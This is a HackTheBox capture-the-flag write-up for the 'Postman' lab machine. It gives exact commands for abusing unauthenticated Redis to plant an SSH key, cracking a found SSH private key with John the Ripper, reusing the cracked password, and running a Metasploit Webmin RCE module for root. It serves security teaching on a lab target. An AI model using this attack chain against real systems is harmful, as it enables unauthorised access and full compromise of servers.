---
title: "HTB - Postman (Easy | Linux | Web)"
date: 2026-09-13 00:00:00 +0000
categories: [HackTheBox, Web]
tags: [htb, cve-2019-12840, webmin, redis, rce, ssh, ssh-key-cracking, john, linpeas, metasploit]
image:
  path: https://i.pinimg.com/originals/f1/eb/a0/f1eba09749f72888d17f62c3ae0c7e7e.gif
---

## Reconnaissance Phase

### Initial Network Scanning

The reconnaissance phase begins with a comprehensive network scan using Nmap to identify open ports and running services on the target machine.
```bash
nmap -p- -sC -sV --open --min-rate 5000 10.129.2.1
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1)
|_http-server-header: MiniServ/1.910

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Service Discovery Analysis

The Nmap scan reveals four key services running on the target machine:

- **SSH (Port 22):** OpenSSH 7.6p1 running on Ubuntu, potentially vulnerable to known exploits
- **HTTP (Port 80):** Apache web server hosting a personal website
- **Redis (Port 6379):** Redis key-value store version 4.0.9, an in-memory database
- **Webmin (Port 10000):** MiniServ 1.910 web-based system administration tool

The presence of Redis without authentication and Webmin suggests potential attack vectors through unauthenticated access and credential reuse.

---

## Exploitation Phase - Initial Access

### Stage 1: Redis Remote Code Execution via Arbitrary File Write

Redis is a critical vulnerability vector in this machine. The service runs without authentication, allowing any remote user to connect and execute arbitrary commands. We exploit this by writing an SSH public key to the Redis user's authorized_keys file, enabling SSH access.

**Step 1: Generate SSH Key Pair**

First, generate a new RSA key pair that will be used to authenticate as the Redis user.
```bash
ssh-keygen -t rsa -b 4096 -f ./id_rsa
```

**Output:** Two files are created:

- `id_rsa` (private key)
- `id_rsa.pub` (public key)

**Step 2: Connect to Redis and Configure Directory**

Connect to the Redis service and configure it to write files to the SSH directory.
```bash
redis-cli -h 10.129.2.1
```

Once connected to the Redis prompt, execute the following commands:
```bash
10.129.2.1:6379> config set dir /var/lib/redis/.ssh/
OK

10.129.2.1:6379> config set dbfilename authorized_keys
OK
```

**Step 3: Insert Public Key into Redis Database**

Add the public key to the Redis database. The key is wrapped with newlines to ensure proper formatting.

```bash
10.129.2.1:6379> set my_key "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDnM1By2ac9QnaHPIoLyHKtdgoQCwEMfr2cA5vNy8kG9V4ziv1qeXccY+It5p6JqwrTsfzG9P+BZsNF1mF6bRS3vsufDP4+RpMYRKup0qjDEnM2pMKdAWJ85mL3G0tB5jTgxZWb/tgtWuZsR+i8A+i3uRhRScZBlSO0gphpD/PSKL09HKjz/sPuIR6/iRtpE18KeEw8vHZ6a5DBIMJv5BDHUZPNgb6rJ0wz5jxdT0y08VwOc7i19kb7LkzxInTp40uujW73pAeMProUX0AQPvfvdnfZ4eO1f9n+xMJjwPBslCfqlmslhCInqrDs7wy/ufen22jMTGfouW9+oVq/qY/+RrPZcSmyppLF4SIfjtpkpwJWGcPDKel8UqYwXs7RR5qaSpUv22PFz2DH6f5G03fb5nZ1MR8y2FP72r1qaW2m3S3p/8HlK9aCvmzsX1hfNyU2D0MPYAuzJWiOQfg4y/EyoKGQid7fokOjnNe9XoBBKI2fwyjPA5VSP/9UvQzej6gV+K3mjPlQrFmcJjTG69op89pFXwbJTdD3uDvjpjkjpNkuCrdRqMJQH1MrGtgDery2VUEZqkD+WHbR0dSTDBuBLuDvN3p/VI3ljUYalPrEBkYaGJI7NYplKQsf23r2PJfU6RFl4nm8Ngtk+wTA4oKa2l0t7ytyTUQR8SeMTgCG4Q==\n\nkali@linux\n\n\n "
OK
```

**Step 4: Persist the Database**

Save the Redis database to write the authorized_keys file.
```bash
10.129.2.1:6379> save
OK
```

**Step 5: SSH Access as Redis User**

Return to your local machine and connect via SSH using the private key.
```bash
chmod 600 id_rsa
ssh -i id_rsa redis@10.129.2.1
```

![Redis SSH Access](/assets/img/Pasted%20image%2020260911165815.png)

---

## Lateral Movement

### Stage 2: Exposed Private SSH Key Discovery and Credential Cracking

Now that we have initial access as the Redis user, we perform system enumeration to discover additional credentials and escalation paths.

**Step 1: System Enumeration with Linpeas**

Upload and execute Linpeas on the target to identify misconfigurations, SUID binaries, and exposed credentials.
```bash
chmod +x linpeas.sh
./linpeas.sh
```

**Output:** Linpeas discovers a private SSH key belonging to another user (matt) stored in an accessible location on the filesystem. This key represents a significant security misconfiguration.

**Step 2: Extract and Convert SSH Key Hash**

Convert the discovered SSH private key to a format that can be cracked using John the Ripper.
```bash
ssh2john id_rsa > hash.txt
```

```
id_rsa:$sshng$1$16$D5E61C5A9D8B7F3E2A1C9B8E7D6F5A4C$1200$[hash_content]
```

**Step 3: Crack SSH Key Password with John**

Use John the Ripper with the rockyou.txt wordlist to crack the SSH key password.
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![SSH Key Cracking](/assets/img/Pasted%20image%2020260911165842.png)

**Step 4: Switch to Matt User**

Use the `su` command to change to the Matt user account.

```bash
su matt
Password: computer2008
```

**Output:** Successfully authenticated as user `matt` with shell access elevated from the `redis` user.

---

## Privilege Escalation to Root

### Stage 3: Webmin Post-authentication Remote Code Execution

With access to the Matt user account, we leverage exposed credentials on the Webmin administration panel to achieve remote code execution as root.

**Step 1: Webmin Login**

Access the Webmin web interface on port 10000 using the Matt user credentials.

```
URL: https://10.129.2.1:10000
Username: Matt
Password: computer2008
```

![Webmin Login](/assets/img/Pasted%20image%2020260911165903.png)

**Step 2: Package Updates Module RCE Exploitation**

Webmin version 1.910 contains a post-authentication remote code execution vulnerability in the Package Updates module (CVE-2019-12840 with CVE-2020-35606 bypass). This vulnerability allows authenticated users to execute arbitrary system commands with root privileges.

Use Metasploit to exploit this vulnerability:
```bash
use exploit/linux/http/webmin_package_updates_rce
set lhost 10.10.17.173
set username matt
set password computer2008
set ssl true
run
```

![Webmin RCE](/assets/img/Pasted%20image%2020260911165919.png)

---

## Attack Chain Summary

1. **Reconnaissance:** Identified four open services via Nmap scanning
2. **Initial Access:** Exploited unauthenticated Redis to write SSH public key and gain shell access as `redis` user
3. **Lateral Movement:** Discovered and cracked exposed SSH private key of `Matt` user
4. **Privilege Escalation:** Leveraged Matt's credentials on vulnerable Webmin instance to execute commands as root via **CVE-2019-12840**
5. **Full Compromise:** Achieved root access and system domination

---

## Key Takeaways

- **Unauthenticated Redis** is a severe vulnerability that can lead to arbitrary file writes and RCE
- **SSH key exposure** in accessible directories is a critical security misconfiguration
- **John the Ripper** can efficiently crack encrypted SSH keys with wordlist attacks
- **CVE-2019-12840** (Webmin RCE) affects versions prior to 1.920 and requires post-authentication access
- **Credential reuse** across services (SSH key password → Webmin credentials) is a common privilege escalation vector
